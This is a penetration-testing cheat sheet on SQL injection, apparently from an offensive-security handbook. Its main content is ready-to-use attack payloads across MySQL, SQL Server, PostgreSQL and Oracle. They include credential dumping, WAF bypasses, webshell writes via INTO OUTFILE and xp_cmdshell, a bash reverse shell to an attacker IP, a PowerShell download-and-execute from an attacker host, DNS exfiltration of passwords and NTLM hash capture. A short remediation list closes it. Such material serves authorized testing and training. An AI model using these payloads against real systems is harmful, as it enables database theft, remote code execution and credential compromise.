# SQL Injection

SQL injection places attacker-controlled input into a query built by the application. It can read or rewrite the database, dump credential hashes, access files on the host, and, on many engines, run OS commands. In web assessments, test for it wherever a parameter reaches a query identified during [Web Enumeration](web-enumeration.md).

{% hint style="warning" %}
`' OR 1=1-- -` proves the input is injectable. It does **not** prove impact. For the report, escalate to a credential dump you cracked, file read/write, or command execution on the host. A login bypass alone gets a low rating; a domain foothold gets a high one.
{% endhint %}

## Fingerprint the engine first

Every payload below is engine-specific past the first probe. Identify the DBMS before you commit to a technique.

| Engine | Version | String concat | Comment | Stacked queries |
| --- | --- | --- | --- | --- |
| **MySQL / MariaDB** | `@@version` | `CONCAT('a','b')` | `-- -`, `#` | No (most PHP drivers) |
| **SQL Server** | `@@version` | `'a'+'b'` | `-- -`, `/* */` | Yes |
| **PostgreSQL** | `version()` | `'a'\|\|'b'` | `-- -` | Yes |
| **Oracle** | `banner FROM v$version` | `'a'\|\|'b'` | `-- -` | No |

## First probes — is it injectable?

```sql
'
"
' OR 1=1-- -
' or '1'='1
admin' -- -
' UNION SELECT NULL-- -
```

An error, a different response length, or a login bypass on any of these means you have injection. Note whether the app echoes SQL errors — that decides error-based vs blind below.

## UNION-based — pull data straight into the response

Works when the injectable query's output is rendered and you can match its column count and types.

### Step 1 — count the columns

```sql
' ORDER BY 1-- -
' ORDER BY 2-- -
' ORDER BY 3-- -
-- Increment until it errors; the last working number is the column count
```

### Step 2 — find which columns print

```sql
' UNION SELECT 1,2,3,4-- -
' UNION SELECT 1,2,3,NULL-- -
' UNION SELECT NULL,2,NULL,4-- -
-- Note which position(s) render a value back to you
```

### Step 3 — enumerate and extract (MySQL example)

```sql
-- Version / current context
' UNION SELECT 1,@@version,3,4-- -

-- Databases
' UNION SELECT 1,schema_name,3,4 FROM information_schema.schemata-- -

-- Tables in a database
' UNION SELECT 1,table_name,3,4 FROM information_schema.tables WHERE table_schema='<DB>'-- -

-- Columns in a table
' UNION SELECT 1,column_name,3,4 FROM information_schema.columns WHERE table_name='<TABLE>'-- -

-- Dump credentials
' UNION SELECT 1,concat(user,0x3a,password),3,4 FROM <DB>.<TABLE>-- -
' UNION SELECT 1,concat(username,0x3a,email),3,4 FROM users-- -
```

## Blind SQLi — no output, infer it

When nothing renders and errors are suppressed, ask true/false questions.

### Boolean-based

```sql
' AND 1=1-- -          -- page renders normally  (TRUE)
' AND 1=2-- -          -- page differs / empty   (FALSE)

-- Extract a character at a time
' AND (SELECT SUBSTRING(username,1,1) FROM users LIMIT 1)='a'-- -
' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a'-- -
```

### Time-based (when even the boolean signal is invisible)

```sql
-- MySQL
' AND SLEEP(5)-- -
' AND IF((SELECT SUBSTRING(username,1,1) FROM users LIMIT 1)='a', SLEEP(5), 0)-- -

-- SQL Server
' AND WAITFOR DELAY '00:00:05'-- -
' IF (1=1) WAITFOR DELAY '00:00:05'-- -

-- PostgreSQL
' AND pg_sleep(5)-- -
' AND CASE WHEN 1=1 THEN pg_sleep(5) ELSE pg_sleep(0) END-- -
```

## Error-based — leak data inside the error message

Fast when the app prints DB errors to the response body — one round trip per value, no timing waits.

```sql
-- MySQL / MariaDB
' AND extractvalue(rand(),concat(0x3a,(SELECT password FROM users LIMIT 1)))-- -
' AND updatexml(null,concat(0x3a,(SELECT user())),null)-- -

-- SQL Server
' AND CONVERT(int,(SELECT @@version))-- -
' AND 1=CAST((SELECT @@version) AS INT)-- -
```

{% hint style="info" %}
`extractvalue()` / `updatexml()` truncate output at ~32 chars. Chunk it with `SUBSTRING((SELECT ...),offset,30)` and loop the offset. `updatexml()` is the drop-in when `extractvalue()` is blocked on MariaDB.
{% endhint %}

Detect error visibility before you commit:

```bash
curl -s "http://<TARGET>/page?id=1'"
# If the body contains "syntax", "unclosed", "SQLSTATE", "error" -> error-based works
```

Chunked manual extraction when a scanner is off-limits:

```bash
for off in 1 31 61 91 121 151; do
  curl -s "http://<TARGET>/page?id=extractvalue(1,concat(0x7e,SUBSTRING((SELECT+GROUP_CONCAT(user_login,0x3a,user_pass+SEPARATOR+0x7c)+FROM+users),$off,30)))--+-"
done
```

## sqlmap — automate detection and extraction

```bash
# Enumerate
sqlmap -u "http://<TARGET>/page?id=1" --batch --dbs
sqlmap -u "http://<TARGET>/page?id=1" --batch -D <DB> --tables
sqlmap -u "http://<TARGET>/page?id=1" --batch -D <DB> -T <TABLE> --dump
sqlmap -u "http://<TARGET>/page?id=1" --batch -D <DB> -T <TABLE> -C username,password --dump

# POST body / specific parameter
sqlmap -u "http://<TARGET>/login" --data="user=admin&pass=test" -p user --batch

# Authenticated / from a saved Burp request
sqlmap -u "http://<TARGET>/page?id=1" --cookie="PHPSESSID=abc123" --batch
sqlmap -r request.txt --batch

# Turn up detection when the easy pass finds nothing
sqlmap -u "http://<TARGET>/page?id=1" --level=5 --risk=3 --batch
sqlmap -u "http://<TARGET>/page?id=1" --technique=BEUSTQ --batch
sqlmap -u "http://<TARGET>/page?id=1" --tamper=space2comment,between --batch

# Escalate: privileges, files, OS shell
sqlmap -u "http://<TARGET>/page?id=1" --is-dba --privileges --batch
sqlmap -u "http://<TARGET>/page?id=1" --file-read="/etc/passwd" --batch
sqlmap -u "http://<TARGET>/page?id=1" --file-write="shell.php" --file-dest="/var/www/html/shell.php" --batch
sqlmap -u "http://<TARGET>/page?id=1" --os-shell --batch
```

{% hint style="warning" %}
Confirm the injection manually before using sqlmap. Manual techniques such as error-based `extractvalue()` and time-based `SLEEP` make the evidence easier to understand and reproduce, while automation can then confirm breadth and impact.
{% endhint %}

## Weaponize — file read, file write, code execution

Injection is rarely the finding. Turning it into a shell or a credential dump is.

### MySQL — read and write files (needs `FILE` privilege)

```sql
-- Read
' UNION SELECT 1,LOAD_FILE('/etc/passwd'),3,4-- -
' UNION SELECT 1,LOAD_FILE('/var/www/html/config.php'),3,4-- -

-- Write a webshell to the docroot
' UNION SELECT 1,"<?php system($_GET['cmd']); ?>",3,4 INTO OUTFILE '/var/www/html/shell.php'-- -
```

### SQL Server — OS commands via xp_cmdshell (needs sa/sysadmin)

```sql
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;

EXEC xp_cmdshell 'whoami';
EXEC xp_cmdshell 'powershell -c "IEX(New-Object Net.WebClient).DownloadString(''http://<ATTACKER_IP>/shell.ps1'')"';
EXEC xp_cmdshell 'echo ^<%eval request("cmd")%^> > C:\inetpub\wwwroot\shell.asp';
```

### PostgreSQL — RCE via COPY FROM PROGRAM (needs superuser)

Check first: `SELECT current_user, usesuper FROM pg_user WHERE usename = current_user;`

```sql
DROP TABLE IF EXISTS cmd_exec;
CREATE TABLE cmd_exec(cmd_output TEXT);
COPY cmd_exec FROM PROGRAM 'id';
SELECT * FROM cmd_exec;

-- Straight to a reverse shell
COPY cmd_exec FROM PROGRAM 'bash -c "bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1"';
```

Older Postgres file read:

```sql
SELECT pg_read_server_file('/etc/passwd', 0, 1000000);
SELECT pg_ls_dir('/var/lib/postgresql');
```

### MSSQL — capture the service account's NTLM hash

Force the SQL service account to authenticate to your listener with `xp_dirtree` (available to any login by default):

```bash
sudo responder -I <ATTACKER_IFACE> -wdv
```

```sql
'; EXEC master..xp_dirtree '\\<ATTACKER_IP>\share'-- -
'; EXEC xp_dirtree '\\<ATTACKER_IP>\share', 1, 1-- -
```

```bash
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
```

## Connect straight to the DB once you have creds

After you pull DB credentials from `.env`, `wp-config.php`, a config dump, or a log-poison, skip the slow injection wrapper and talk to the engine directly over the network (through your tunnel).

```bash
# MySQL / MariaDB
mysql -u root -p'root' -h <TARGET> -P 3306
mysql -u root -p'root' -h <TARGET> -e "SHOW DATABASES;"

# MSSQL (SQL auth, Windows/NTLM auth, or pass-the-hash)
impacket-mssqlclient <USER>:<PASS>@<TARGET>
impacket-mssqlclient <DOMAIN>/<USER>:<PASS>@<TARGET> -windows-auth
impacket-mssqlclient -hashes :<NT_HASH> <DOMAIN>/<USER>@<TARGET> -windows-auth

# PostgreSQL
psql -h <TARGET> -U postgres
psql -h <TARGET> -U postgres -d <DB> -c "SELECT version();"

# Oracle
sqlplus <USER>/<PASS>@<TARGET>:1521/<SID>
```

## Filter and WAF bypass

```sql
-- Case variation
UniOn SeLeCt 1,2,3

-- Inline comments (MySQL) / versioned comments
UN/**/ION SE/**/LECT 1,2,3
/*!50000UNION*/ /*!50000SELECT*/ 1,2,3

-- Whitespace alternatives
UNION%0aSELECT   -- newline
UNION%09SELECT   -- tab
UNION%0dSELECT   -- carriage return
UNION(SELECT(1),(2),(3))   -- no spaces at all

-- Double URL encoding
%2527 -> '     %2520 -> space

-- Keyword rebuild via concat
CONCAT('sel','ect')   -- MySQL
'sel'+'ect'           -- MSSQL
'sel'||'ect'          -- Oracle / PostgreSQL

-- Hex-encoded strings dodge quote filters
SELECT * FROM users WHERE name=0x61646d696e   -- 'admin'
```

Keyword-WAF swap table when `OR`/`AND`/`UNION`/`SELECT` are blocked:

| Blocked | Alternative |
| --- | --- |
| `OR` | `\|\|` |
| `AND` | `&&` |
| `-- ` (dash-dash-space) | `#` or `-- -` |
| space | `/**/`, `%09`, `%0b`, `%0c` |
| `SELECT` | `SeLeCt`, `%53ELECT`, `+SELECT` |
| `UNION` | `UnIoN`, `UNION/**/SELECT` |
| `=` | `LIKE`, `BETWEEN` |

{% hint style="info" %}
When `<` and `>` are HTML-entity-encoded on the way to the DB, comparison operators break — use `BETWEEN x AND y`, or stay on `extractvalue()`, which needs no comparison operator at all.
{% endhint %}

## Second-order SQLi — stored now, fires later

The payload is stored cleanly, then a *later* query interpolates it unsanitized.

```
1. Register user with username: admin'-- -
2. App stores it verbatim
3. A password-change routine runs:
   UPDATE users SET password='newpass' WHERE username='admin'-- -'
4. admin's password changes instead of yours
```

Common triggers: registration, profile updates, and comment fields that get re-queried on display.

## Out-of-band SQLi — exfiltrate through DNS/HTTP

For no-output, no-timing contexts, push data to a channel you control.

```sql
-- MySQL (FILE privilege + outbound)
SELECT LOAD_FILE(CONCAT('\\\\',@@version,'.<ATTACKER_IP>\\share'));

-- MSSQL DNS exfil with data
DECLARE @d varchar(1024); SET @d=(SELECT TOP 1 password FROM users);
EXEC('master..xp_dirtree "\\'+@d+'.<ATTACKER_IP>\share"');

-- Oracle
SELECT UTL_HTTP.REQUEST('http://<ATTACKER_IP>/'||(SELECT user FROM dual)) FROM dual;
```

## SOAP / XML service SQLi (common in ASP.NET)

Inject through XML parameter values. The `charset=utf-8` header matters — without it, ASP.NET SOAP handlers silently mangle SQL function output and you get empty results.

```http
POST /service.asmx HTTP/1.1
Content-Type: text/xml; charset=utf-8
SOAPAction: "http://tempuri.org/methodName"

<Envelope xmlns="http://schemas.xmlsoap.org/soap/envelope/">
  <Body>
    <methodName xmlns="http://tempuri.org/">
      <param>') UNION SELECT NULL,NULL,NULL,SUSER_NAME()-- -</param>
    </methodName>
  </Body>
</Envelope>
```

Camel-case bypass when `EXEC`/`xp_cmdshell`/`RECONFIGURE` are keyword-filtered, chaining stacked queries to full RCE:

```sql
'); eXEC sp_configure 'show advanced options', 1; RECOnFIGURE;
    eXEC sp_configure 'Xp_cmdshell', 1; RECOnFIGURE;
    eXEC master..Xp_cmdshell 'cmd.exe /c whoami > c:\temp\proof.txt';-- -
```

## Extra tradecraft you will actually use

**Hash rewrite on `UPDATE`.** You have write access but the stored hash won't crack — swap in a hash whose plaintext you know.

```sql
-- Unsalted sha1, known-good "admin"
UPDATE users SET password='df5b909019c9b1659e86e0d6bf8da81d6fa3499e' WHERE username='admin';

-- Handy known-plaintext hashes
-- admin (bcrypt): $2y$10$92IXUNpkjO0rOQ5byMi.Ye4oKoEa3Ro9llC/.og/at2.uheWG/igi
-- admin (MD5):    21232f297a57a5a743894a0e4a801fc3
-- password (MD5): 5f4dcc3b5aa765d61d8327deb882cf99
```

**WebSocket-only app?** A scanner can't hit a WebSocket directly. Run a tiny local HTTP-to-WS bridge and point the scanner at loopback:

```python
#!/usr/bin/env python3
# ws_proxy.py — bridge plain HTTP to a WebSocket backend
import asyncio, websockets
from http.server import BaseHTTPRequestHandler, HTTPServer

WS_URL = "ws://<TARGET>/ws"

class ProxyHandler(BaseHTTPRequestHandler):
    def do_POST(self):
        body = self.rfile.read(int(self.headers.get('Content-Length', 0))).decode()
        result = asyncio.run(self.forward(body))
        self.send_response(200); self.end_headers(); self.wfile.write(result.encode())
    async def forward(self, payload):
        async with websockets.connect(WS_URL) as ws:
            await ws.send(payload); return await ws.recv()
    def log_message(self, *a): pass

HTTPServer(("127.0.0.1", 8081), ProxyHandler).serve_forever()
```

```bash
python3 ws_proxy.py &
sqlmap -u "http://127.0.0.1:8081/" --data='{"id":"1"}' -p id --dbms=mysql --batch --level=5 --risk=3 --dbs
```

**Webshell on a loopback-only docroot.** If `INTO OUTFILE` landed a shell on a web root bound to 127.0.0.1, reach it through an open Squid proxy on the target:

```bash
curl -s -x http://<TARGET>:3128 "http://127.0.0.1:<PORT>/shell.php?cmd=whoami"
```

## Testing workflow

```bash
# 1. Map every parameter that reaches a query (URL, POST, JSON, cookies, headers) - see Web Enumeration
# 2. Fire the first probes; note errors, length changes, and login bypass
# 3. Fingerprint the engine (@@version / version())
# 4. Pick the technique that fits the feedback:
#      output rendered      -> UNION
#      errors printed       -> error-based (extractvalue)
#      no output, no errors -> boolean, then time-based
# 5. Dump credentials, crack offline, and escalate to file R/W or OS commands
burpsuite      # intercept, repeat, tune payloads
sqlmap         # automate once you understand the injection point
hashcat        # crack the dumped hashes
```

## Prove impact, don't just bypass login

For the [report](report-writing.md), show the real consequence: a cracked credential set you reused, source or config files read off disk, a webshell written through `INTO OUTFILE`, or `xp_cmdshell`/`COPY FROM PROGRAM` command execution. `' OR 1=1-- -` proves the bug; the extracted data and the shell prove the finding and set the severity.

## Fix guidance (for the remediation section)

* **Parameterized queries / prepared statements** everywhere. This is the primary fix — bind values, never concatenate them into the SQL string.
* **Input validation**: type-check (int, email), length-limit, and allowlist expected characters — as defense in depth, not the main control.
* **Least-privilege DB accounts**: the app user gets no `FILE`, no `DROP/ALTER`, and is never `sa`/superuser.
* **Suppress DB errors** to the client — kills error-based extraction and the fingerprinting it feeds.
* **WAF** as a backstop only; every bypass table above exists because WAFs are bypassable.

## Related

* [Web Enumeration](web-enumeration.md) — find the parameters that reach a query first
* [HTTP Attacks](http-attacks.md) · [Command Injection](command-injection.md) · [File Inclusion](file-inclusion.md) · [File Upload](file-upload.md)
* [Cross-Site Scripting](xss.md) — the client-side injection counterpart
* [Server-Side Attacks](server-side-attacks.md) — SSRF, deserialization, and template injection on the same inputs
* [Report Writing](report-writing.md) — turning a dumped database into a rated finding
